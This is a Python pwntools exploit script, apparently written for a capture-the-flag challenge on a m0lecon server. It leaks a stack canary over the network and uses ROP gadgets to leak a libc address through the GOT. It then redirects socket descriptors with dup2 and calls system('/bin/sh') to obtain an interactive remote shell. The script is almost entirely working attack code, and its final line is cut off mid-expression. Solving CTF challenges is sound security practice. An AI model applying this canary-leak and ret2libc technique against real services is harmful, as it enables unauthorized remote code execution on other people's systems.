from pwn import *
from pwn import log as Log


pop_rdi=0x00000000004014f3
pop_rsi=0x00000000004014f1
send_plt=0x401254
exit_plt=0x400ca0
ret=0x000000000040028e
got_start_main=0x0000000000601ff0
def log(title,value):
	Log.info(title + ": {} ".format(hex(value)))

"""
host="127.0.0.1"
port=1234
"""
host="challs.m0lecon.it" 
port=9010

p=remote(host,port)
p.sendline("LOAD 3 3")
canary=u64(p.recv().ljust(8,"\x00"))
log("canary",canary)

p.close()
p=remote(host,port)
payload=""
payload+="EXIT "
payload+="A"*(40-len(payload))
payload+=p64(canary)
payload+="B"*(56-len(payload))
payload+=p64(pop_rdi)
payload+=p64(4)
payload+=p64(pop_rsi)
payload+=p64(got_start_main)
payload+=p64(0xdeadbeef)
payload+=p64(send_plt)


payload+=p64(pop_rdi)
payload+=p64(4)
payload+=p64(pop_rsi)
payload+=p64(got_start_main)
payload+=p64(0xdeadbeef)
payload+=p64(send_plt)
p.sendline(payload)

leak=u64(p.recv()[:6].ljust(8,"\x00"))
base=leak-0x0000000000021ab0
system=base+0x000000000004f440
dup2=base+0x00000000001109a0
binsh=base+0x1b3e9a

log("leak",leak)
log("base",base)
log("system",system)
log("/bin/sh",binsh)
log("dup2",dup2)

p=remote(host,port)

payload=""
payload+="EXIT "
payload+="A"*(40-len(payload))
payload+=p64(canary)
payload+="B"*(56-len(payload))
payload+=p64(pop_rdi)
payload+=p64(4)
payload+=p64(pop_rsi)
payload+=p64(0)
payload+=p64(0xdeadbeef)
payload+=p64(dup2)

payload+=p64(pop_rdi)
payload+=p64(4)
payload+=p64(pop_rsi)
payload+=p64(1)
payload+=p64(0xdeadbeef)
payload+=p64(dup2)

payload+=p64(ret)
payload+=p64(pop_rdi)
payload+=p64(binsh)
payload+=p64(system)


p.sendline(payload)
p.interactive()

p=remote(host,port)
payload=""
payload+="STORE 1 1 "
payload+="A"*()